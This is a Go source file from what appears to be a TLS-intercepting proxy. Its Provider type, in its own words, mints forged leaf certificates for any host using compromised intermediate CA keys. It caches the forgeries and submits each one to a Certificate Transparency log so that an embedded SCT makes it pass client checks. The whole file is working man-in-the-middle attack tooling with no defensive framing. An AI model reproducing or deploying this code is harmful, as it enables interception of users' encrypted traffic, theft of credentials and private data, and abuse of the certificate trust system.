package tlsutil

import (
	"context"
	"crypto"
	"crypto/ecdsa"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/nicois/prox/pkg/config"
)

// Provider mints forged leaf certificates from compromised intermediate
// CAs. CAs are used round-robin; leaves are cached per host and reused
// while now < NotAfter - re-interval. When a CT log URL is configured,
// each freshly minted leaf is submitted (with one retry) and, on success,
// re-issued with the returned SCT embedded.
type Provider struct {
	cas      []ca
	validity time.Duration // half-window: +/- around the mint time
	reint    time.Duration
	ctLogURL string
	ctClient *http.Client

	mu    sync.Mutex
	rr    int
	cache map[string]*leafEntry
}

type ca struct {
	cert  *x509.Certificate
	key   crypto.Signer
	chain [][]byte // extra certs served after the intermediate
}

type leafEntry struct {
	cert    *tls.Certificate
	expires time.Time
}

// NewProvider loads the CA pairs (PEM files) and returns a provider. An
// empty CA list is allowed; Leaf fails until CAs are present.
func NewProvider(cas []config.CAPath, m config.MITM) (*Provider, error) {
	p := &Provider{
		validity: time.Duration(m.ValidityDays) * 24 * time.Hour,
		reint:    m.ReintBeforeExpiry,
		ctLogURL: m.CTLogURL,
		ctClient: &http.Client{Timeout: 10 * time.Second},
		cache:    make(map[string]*leafEntry),
	}
	for _, cp := range cas {
		c, err := loadCA(cp.CertPEM, cp.KeyPEM, cp.ChainPEM)
		if err != nil {
			return nil, fmt.Errorf("tlsutil: CA %s: %w", cp.CertPEM, err)
		}
		p.cas = append(p.cas, c)
	}
	ct := "none"
	if p.ctLogURL != "" {
		ct = p.ctLogURL
	}
	slog.Info("leaf provider ready", "cas", len(p.cas), "ct_log", ct)
	return p, nil
}

// Leaf returns the forged leaf certificate for (host, dst) as of now.
// host is the SNI and may be empty; dst is the original destination
// address string.
func (p *Provider) Leaf(host, dst string, now time.Time) (*tls.Certificate, error) {
	if len(p.cas) == 0 {
		return nil, errors.New("tlsutil: no CA configured")
	}
	key := host
	if key == "" {
		key = dst
	}
	p.mu.Lock()
	if e, ok := p.cache[key]; ok && now.Before(e.expires.Add(-p.reint)) {
		p.mu.Unlock()
		return e.cert, nil
	}
	inter := p.cas[p.rr%len(p.cas)]
	p.rr++
	p.mu.Unlock()

	// Minting and the CT submission run without p.mu: a slow or down CT
	// log may stall this host's first connection, but must not serialize
	// every concurrent Leaf call on it.
	leaf, leafKey, err := MintLeaf(inter.cert, inter.key, host, dst, now.Add(-p.validity), now.Add(p.validity))
	if err != nil {
		return nil, err
	}
	leaf = p.withSCT(leaf, inter)
	slog.Debug("leaf minted", "host", key, "ca", inter.cert.Subject.CommonName, "valid_until", leaf.NotAfter.UTC().Format(time.RFC3339))
	chain := make([][]byte, 0, 2+len(inter.chain))
	chain = append(chain, leaf.Raw, inter.cert.Raw)
	entry := &leafEntry{
		cert:    &tls.Certificate{Certificate: append(chain, inter.chain...), PrivateKey: leafKey},
		expires: leaf.NotAfter,
	}
	p.mu.Lock()
	if e, ok := p.cache[key]; ok && now.Before(e.expires.Add(-p.reint)) {
		// A concurrent call for the same host finished its mint first
		// (duplicated CT submission, harmless): reuse its entry.
		p.mu.Unlock()
		return e.cert, nil
	}
	p.cache[key] = entry
	p.mu.Unlock()
	return entry.cert, nil
}

// withSCT submits the fresh leaf to the CT log (one retry) and re-issues
// it with the returned SCT embedded; any failure returns the SCT-less leaf.
func (p *Provider) withSCT(leaf *x509.Certificate, inter ca) *x509.Certificate {
	if p.ctLogURL == "" {
		return leaf
	}
	host := leaf.Subject.CommonName
	// The addchain chain must reach the self-signed anchor: intermediate
	// plus every extra chain cert (chain_pem).
	chain := make([][]byte, 0, 1+len(inter.chain))
	chain = append(chain, inter.cert.Raw)
	chain = append(chain, inter.chain...)
	var submitErr error
	for range 2 {
		sctList, err := SubmitSCT(context.Background(), p.ctClient, p.ctLogURL, leaf.Raw, chain)
		if err != nil {
			submitErr = err
			continue
		}
		signed, err := p.embedSCT(leaf, sctList, inter)
		if err != nil {
			slog.Warn("sct", "host", host, "embedded", false, "err", err)
			return leaf
		}
		slog.Info("sct", "host", host, "embedded", true)
		return signed
	}
	slog.Warn("sct", "host", host, "embedded", false, "url", p.ctLogURL, "err", submitErr)
	return leaf
}

// embedSCT re-issues leaf with the signed timestamp list embedded. The
// intermediate still signs, but the re-issued leaf keeps its own public key
// (the one parsed from leaf) rather than the intermediate's, so the served
// certificate keeps matching the served key.
func (p *Provider) embedSCT(leaf *x509.Certificate, sctList []byte, inter ca) (*x509.Certificate, error) {
	tmpl, err := x509.ParseCertificate(leaf.Raw)
	if err != nil {
		return nil, err
	}
	der, err := x509.CreateCertificate(rand.Reader, EmbedSCT(tmpl, sctList), inter.cert, tmpl.PublicKey, inter.key)
	if err != nil {
		return nil, err
	}
	return x509.ParseCertificate(der)
}

func loadCA(certPEM, keyPEM, chainPEM string) (ca, error) {
	certDer, err := readPEMFile(certPEM, "CERTIFICATE")
	if err != nil {
		return ca{}, err
	}
	cert, err := x509.ParseCertificate(certDer)
	if err != nil {
		return ca{}, fmt.Errorf("parse cert: %w", err)
	}
	key, err := loadKeyFile(keyPEM)
	if err != nil {
		return ca{}, err
	}
	c := ca{cert: cert, key: key}
	if chainPEM != "" {
		blocks, err := readAllPEMFile(chainPEM, "CERTIFICATE")
		if err != nil {
			return ca{}, fmt.Errorf("chain_pem: %w", err)
		}
		for i, der := range blocks {
			if _, err := x509.ParseCertificate(der); err != nil {
				return ca{}, fmt.Errorf("chain_pem %s cert %d: %w", chainPEM, i, err)
			}
			c.chain = append(c.chain, der)
		}
	}
	return c, nil
}

func loadKeyFile(path string) (crypto.Signer, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	for {
		var block *pem.Block
		block, data = pem.Decode(data)
		if block == nil {
			break
		}
		switch block.Type {
		case "EC PRIVATE KEY":
			k, err := x509.ParseECPrivateKey(block.Bytes)
			if err != nil {
				return nil, fmt.Errorf("EC key: %w", err)
			}
			return k, nil
		case "RSA PRIVATE KEY":
			k, err := x509.ParsePKCS1PrivateKey(block.Bytes)
			if err != nil {
				return nil, fmt.Errorf("RSA key: %w", err)
			}
			return k, nil
		case "PRIVATE KEY":
			k, err := x509.ParsePKCS8PrivateKey(block.Bytes)
			if err != nil {
				return nil, fmt.Errorf("PKCS8 key: %w", err)
			}
			switch kk := k.(type) {
			case *ecdsa.PrivateKey:
				return kk, nil
			case *rsa.PrivateKey:
				return kk, nil
			case ed25519.PrivateKey:
				return kk, nil
			default:
				return nil, fmt.Errorf("unsupported PKCS8 key type %T", k)
			}
		}
	}
	return nil, errors.New("no recognized private key block")
}

func readPEMFile(path, blockType string) ([]byte, error) {
	blocks, err := readAllPEMFile(path, blockType)
	if err != nil {
		return nil, err
	}
	return blocks[0], nil
}

// readAllPEMFile returns the bytes of every PEM block of blockType in the
// file, in order.
func readAllPEMFile(path, blockType string) ([][]byte, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var blocks [][]byte
	for {
		var block *pem.Block
		block, data = pem.Decode(data)
		if block == nil {
			break
		}
		if block.Type == blockType {
			blocks = append(blocks, block.Bytes)
		}
	}
	if len(blocks) == 0 {
		return nil, fmt.Errorf("no %s block in %s", blockType, path)
	}
	return blocks, nil
}
